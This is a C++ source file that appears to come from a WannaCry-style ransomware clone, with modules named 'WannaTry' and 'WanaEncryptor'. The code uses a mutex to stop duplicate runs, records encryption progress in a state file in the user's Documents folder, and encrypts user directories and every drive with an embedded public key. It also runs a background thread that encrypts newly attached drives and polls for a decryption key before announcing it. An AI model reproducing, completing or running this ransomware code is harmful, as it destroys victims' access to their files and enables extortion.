#include <ShlObj.h>
#include "WanaProc.h"
#include "../Common/common.h"
#include "../Common/ezfile.h"
#include "../EZCrypt/Keys.h"
#include "../WannaTry/WanaEncryptor.h"

////////////////////////////////////////////////
// 00000000.res
////////////////////////////////////////////////

RESDATA::RESDATA(LPCTSTR lpResFile)
{
	if (lpResFile) {
		_tcscpy_s(m_FileName, lpResFile);
	}
	else {
		TCHAR BasePath[MAX_PATH];
		LONG nKeyNo = 0;
		HRESULT result = SHGetFolderPath(
			NULL,
			CSIDL_PERSONAL,
			NULL,
			SHGFP_TYPE_CURRENT,
			BasePath);
		_tcscat_s(BasePath, MAX_PATH, _T("\\"));
		_tcscat_s(BasePath, MAX_PATH, BASE_DIRNAME);
		_stprintf_s(m_FileName,
			_T("%s\\%08x.res"), BasePath, nKeyNo);
	}
	if (GetFileAttributes(m_FileName) ==
		INVALID_FILE_ATTRIBUTES) {
		BCryptGenRandom(NULL, m_nID, 8,
			BCRYPT_USE_SYSTEM_PREFERRED_RNG);
		m_ExecTime = time(NULL);
		ZeroMemory(_reserved, sizeof(_reserved));
		ZeroMemory(&m_EndTime, sizeof(time_t));
		ZeroMemory(&m_StartTime, sizeof(time_t));
		m_TotalFile = 0;
		m_TotalSize.QuadPart = 0;
		Save();
	}
	else {
		Load();
	}
}

RESDATA::~RESDATA()
{
}

BOOL RESDATA::Load()
{
	HANDLE hFile;
	ULONG cbRead;
	BOOL bResult = FALSE;

	if ((hFile = CreateFile(
		m_FileName,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	)) == INVALID_HANDLE_VALUE) {
		DEBUG("open %s fails: %d\n",
			m_FileName, GetLastError());
		return FALSE;
	}

	if (m_nID && !(bResult = ReadFile(
		hFile,
		m_nID,
		sizeof(m_nID),
		&cbRead,
		0))) {
		DEBUG("Read %s error: %d\n",
			m_FileName, GetLastError());
		goto Error_Exit;
	}
	if (m_ExecTime && !(bResult = ReadFile(
		hFile,
		&m_ExecTime,
		sizeof(m_ExecTime),
		&cbRead,
		0))) {
		DEBUG("Read %s error: %d\n",
			m_FileName, GetLastError());
		goto Error_Exit;
	}
	if (!(bResult = ReadFile(
		hFile,
		&_reserved,
		sizeof(_reserved),
		&cbRead,
		0))) {
		DEBUG("Read %s error: %d\n",
			m_FileName, GetLastError());
		goto Error_Exit;
	}
	if (m_EndTime && !(bResult = ReadFile(
		hFile,
		&m_EndTime,
		sizeof(m_EndTime),
		&cbRead,
		0))) {
		DEBUG("Read %s error: %d\n",
			m_FileName, GetLastError());
		goto Error_Exit;
	}
	if (m_StartTime && !(bResult = ReadFile(
		hFile,
		&m_StartTime,
		sizeof(m_StartTime),
		&cbRead,
		0))) {
		DEBUG("Read %s error: %d\n",
			m_FileName, GetLastError());
		goto Error_Exit;
	}
	if (m_TotalFile && !(bResult = ReadFile(
		hFile,
		&m_TotalFile,
		sizeof(m_TotalFile),
		&cbRead,
		0))) {
		DEBUG("Read %s error: %d\n",
			m_FileName, GetLastError());
		goto Error_Exit;
	}
	if (m_TotalSize.QuadPart &&
		!(bResult = ReadFile(
			hFile,
			&m_TotalSize.QuadPart,
			sizeof(m_TotalSize.QuadPart),
			&cbRead,
			0))) {
		DEBUG("Read %s error: %d\n",
			m_FileName, GetLastError());
		goto Error_Exit;
	}
	bResult = TRUE;
Error_Exit:
	CloseHandle(hFile);
	return bResult;
}

BOOL RESDATA::Save()
{
	HANDLE hFile;
	ULONG cbWrite;
	BOOL bResult = FALSE;

	if ((hFile = CreateFile(
		m_FileName,
		GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	)) == INVALID_HANDLE_VALUE) {
		DEBUG("Open file %s error\n",
			m_FileName);
		return FALSE;
	}

	if (!(bResult = WriteFile(
		hFile,
		m_nID,
		sizeof(m_nID),
		&cbWrite,
		0
	))) {
		DEBUG("Write %s error\n",
			m_FileName);
		goto Error_Exit;
	}
	if (!(bResult = WriteFile(
		hFile,
		&m_ExecTime,
		sizeof(m_ExecTime),
		&cbWrite,
		0
	))) {
		DEBUG("Write %s error\n",
			m_FileName);
		goto Error_Exit;
	}
	if (!(bResult = WriteFile(
		hFile,
		&_reserved,
		sizeof(_reserved),
		&cbWrite,
		0
	))) {
		DEBUG("Write %s error\n",
			m_FileName);
		goto Error_Exit;
	}
	if (!(bResult = WriteFile(
		hFile,
		&m_EndTime,
		sizeof(m_EndTime),
		&cbWrite,
		0
	))) {
		DEBUG("Write %s error\n",
			m_FileName);
		goto Error_Exit;
	}
	if (!(bResult = WriteFile(
		hFile,
		&m_StartTime,
		sizeof(m_StartTime),
		&cbWrite,
		0
	))) {
		DEBUG("Write %s error\n",
			m_FileName);
		goto Error_Exit;
	}
	if (!(bResult = WriteFile(
		hFile,
		&m_TotalFile,
		sizeof(m_TotalFile),
		&cbWrite,
		0
	))) {
		DEBUG("Write %s error\n",
			m_FileName);
		goto Error_Exit;
	}
	if (!(bResult = WriteFile(
		hFile,
		&m_TotalSize.QuadPart,
		sizeof(m_TotalSize.QuadPart),
		&cbWrite,
		0
	))) {
		DEBUG("Write %s error\n",
			m_FileName);
		goto Error_Exit;
	}
	bResult = TRUE;
Error_Exit:
	CloseHandle(hFile);
	return bResult;
}

BOOL RESDATA::SetEndTime(time_t t=0)
{
	if (!t) {
		if (!m_EndTime) {
			m_EndTime = time(NULL);
		}
	}
	else {
		m_EndTime = t;
	}
	return Save();
}
BOOL RESDATA::SetStartTime(time_t t=0)
{
	if (!t) {
		if (!m_StartTime) {
			m_StartTime = time(NULL);
		}
	}
	else {
		m_StartTime = t;
	}
	return Save();
}
BOOL RESDATA::SetTotalFile(ULONG n)
{
	m_TotalFile = n;
	return Save();
}
BOOL RESDATA::AddTotalFile(ULONG n)
{
	return SetTotalFile(m_TotalFile + n);
}
BOOL RESDATA::SetTotalSize(PLARGE_INTEGER n)
{
	m_TotalSize.QuadPart = n->QuadPart;
	return Save();
}
BOOL RESDATA::AddTotalSize(PLARGE_INTEGER n)
{
	m_TotalSize.QuadPart += n->QuadPart;
	return Save();
}

////////////////////////////////////////////////
// Other routines
////////////////////////////////////////////////

BOOL CheckEncryptorMutex(LPCTSTR pName)
{
	HANDLE hMutex = CreateMutex(
		NULL,
		TRUE,
		pName);
	if (hMutex && GetLastError() == ERROR_ALREADY_EXISTS) {
		CloseHandle(hMutex);
		return TRUE;
	}
	return FALSE;
}

BOOL CreateEncryptorMutex(LPCTSTR pName)
{
	HANDLE hMutex = OpenMutex(
		SYNCHRONIZE,
		TRUE,
		pName);
	if (hMutex) {
		CloseHandle(hMutex);
		return TRUE;
	}
	else {
		hMutex = CreateMutex(
			NULL,
			TRUE,
			pName);
		if (hMutex && GetLastError()
			== ERROR_ALREADY_EXISTS) {
			CloseHandle(hMutex);
			return TRUE;
		}
		else {
			return FALSE;
		}
	}
	return FALSE;
}

BOOL CheckDKYThread(LPVOID pFlag)
{
	BOOL* pResult = (BOOL*)pFlag;
	if (pResult && !*pResult) {
		while (!(*pResult = CheckDKYFileValid(0))) {
			Sleep(500);
		}
		MessageBox(NULL,
			_T("Decryption Key is AVAILABLE now"),
			_T("Congratulations"),
			MB_OK);
	}
	ExitThread(0);
}

BOOL DriverMonitorThread()
{
	DWORD LastDrivers = 0, CurrentDrivers = 0;
	TCHAR szRootPathName[16] = ENCRYPT_ROOT_PATH;
	PWanaCryptor pCryptor = NULL;
	pCryptor = new WanaCryptor(
		WannaPublicKey,
		WannaPublicKeySize());
	while (!GetDecryptFlag()) {
		Sleep(3000);
		DEBUG("DecryptMode: %d\n", GetDecryptFlag());
		LastDrivers = CurrentDrivers;
		CurrentDrivers = GetLogicalDrives();
		DEBUG("CurrentDrivers: %d, last: %d\n",
			CurrentDrivers, LastDrivers);
		if (CurrentDrivers != LastDrivers) {
			for (int DiskNO = 0;
				DiskNO < 26 && !GetDecryptFlag();
				DiskNO++) {
				szRootPathName[0] = DiskNO + 65;
				CurrentDrivers = GetLogicalDrives();
				if ((CurrentDrivers >> DiskNO) & 1 &&
					!((LastDrivers >> DiskNO) & 1)) {
					if (GetFileAttributes(szRootPathName) !=
						INVALID_FILE_ATTRIBUTES) {
						DEBUG("Monitor: encrypt %s\n",
							szRootPathName);
						pCryptor->Encrypt(szRootPathName);
					}
					else {
						DEBUG("Monitor: %s not found\n",
							szRootPathName);
					}
				}
			}
		}
	}
	delete pCryptor;
	pCryptor = NULL;
	return TRUE;
	ExitThread(0);
}

HANDLE CreateThread_CheckKeyMatch() {
	HANDLE hThread = CreateThread(
		0,
		0,
		(LPTHREAD_START_ROUTINE)CheckDKYFileValid,
		NULL,
		0,
		0);
	if (hThread) {
		CloseHandle(hThread);
		hThread	= NULL;
	}
	return hThread;
}

HANDLE CreateThread_DriverMonitor() {
	HANDLE hThread = CreateThread(
		0,
		0,
		(LPTHREAD_START_ROUTINE)DriverMonitorThread,
		NULL,
		0,
		0);
	if (hThread) {
		CloseHandle(hThread);
		hThread = NULL;
	}
	return hThread;
}


BOOL Destroy_Key(DWORD nKeyNo)
{
	TCHAR BasePath[MAX_PATH];
	TCHAR szEKYFile[MAX_PATH];
	BOOL bResult = GetDecryptFlag();
	if (bResult) {
		return FALSE;
	}
	HRESULT result = SHGetFolderPath(
		NULL,
		CSIDL_PERSONAL,
		NULL,
		SHGFP_TYPE_CURRENT,
		BasePath);
	_tcscat_s(BasePath, MAX_PATH, _T("\\"));
	_tcscat_s(BasePath, MAX_PATH, BASE_DIRNAME);
	_stprintf_s(szEKYFile, MAX_PATH,
		_T("%s\\%08x.eky"), BasePath, nKeyNo);
	FakeDeleteFile(szEKYFile);
	return TRUE;
}

BOOL IsKeyDestroyed(DWORD nKeyNo)
{
	TCHAR BasePath[MAX_PATH];
	TCHAR szPKYFile[MAX_PATH];
	TCHAR szEKYFile[MAX_PATH];
	TCHAR szDKYFile[MAX_PATH];
	BOOL bResult = GetDecryptFlag();
	if (bResult) {
		return FALSE;
	}
	HRESULT result = SHGetFolderPath(
		NULL,
		CSIDL_PERSONAL,
		NULL,
		SHGFP_TYPE_CURRENT,
		BasePath);
	_tcscat_s(BasePath, MAX_PATH, _T("\\"));
	_tcscat_s(BasePath, MAX_PATH, BASE_DIRNAME);
	_stprintf_s(szPKYFile, MAX_PATH,
		_T("%s\\%08x.pky"), BasePath, nKeyNo);
	_stprintf_s(szEKYFile, MAX_PATH,
		_T("%s\\%08x.eky"), BasePath, nKeyNo);
	_stprintf_s(szDKYFile, MAX_PATH,
		_T("%s\\%08x.dky"), BasePath, nKeyNo);
	if (GetFileAttributes(szPKYFile) ==
		INVALID_FILE_ATTRIBUTES) {
		return FALSE;
	}
	if (GetFileAttributes(szDKYFile) !=
		INVALID_FILE_ATTRIBUTES) {
		return FALSE;
	}
	if (GetFileAttributes(szEKYFile) !=
		INVALID_FILE_ATTRIBUTES) {
		return FALSE;
	}
	return TRUE;
}


BOOL Start_Wannatry(LPCTSTR pMutexName) {
	static HANDLE hCheckKeyMatch;
	static HANDLE hDriverMonitor;
	ULONG CurrentFile = 0;
	LARGE_INTEGER TotalSize = { 0 };
	if (CheckEncryptorMutex(pMutexName)) {
		return FALSE;
	}
	CreateEncryptorMutex(pMutexName);
	//
	PRESDATA pResData = new RESDATA(NULL);
	DEBUG("Thread: Check 00000000.pky 00000000.dky\n");
	hCheckKeyMatch =
		CreateThread_CheckKeyMatch();
	if (!GetDecryptFlag()) {
		pResData->SetStartTime();
		DEBUG("Encrypt User Directories\n");
		PWanaCryptor pWanaCryptor =
			new WanaCryptor(
				WannaPublicKey,
				WannaPublicKeySize());
		pWanaCryptor->EncryptUsers();
		//
		DEBUG("Encrypt All Drivers\n");
		pWanaCryptor->EncryptDrivers();
		pResData->SetEndTime();
		//
		CurrentFile = pWanaCryptor->GetTotalFile();
		LARGE_INTEGER CurrentSize = { 0 };
		pWanaCryptor->GetTotalSize(&CurrentSize);
		pResData->AddTotalFile(CurrentFile);
		pResData->AddTotalSize(&CurrentSize);
		//
		delete pWanaCryptor;
		//
		DEBUG("Thread: Monitor Drivers\n");
		hDriverMonitor =
			CreateThread_DriverMonitor();
	}
	return TRUE;
}
